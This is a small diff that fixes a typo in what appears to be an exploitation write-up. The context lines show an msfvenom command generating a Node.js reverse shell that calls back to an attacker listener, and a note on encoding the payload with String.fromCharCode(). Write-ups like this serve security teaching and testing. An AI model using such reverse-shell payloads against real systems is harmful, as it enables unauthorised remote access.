@@ -318,7 +318,7 @@ Fortunately, `msfvenom` is able to generate a Node.js reverse shell payload.
 
 ```
 # msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.30.128 LPORT=44444 -o rev.js
-# echo '1+1;' >> rev.js  <-- this is to make toString() has something to do ;)
+# echo '1+1;' >> rev.js  <-- this is to make sure toString() has something to do ;)
 ```
 
 We also need to ensure that our payload is a string. To do that, we could encode our payload into ordinal numbers and piece them back together with `String.fromCharCode()`.
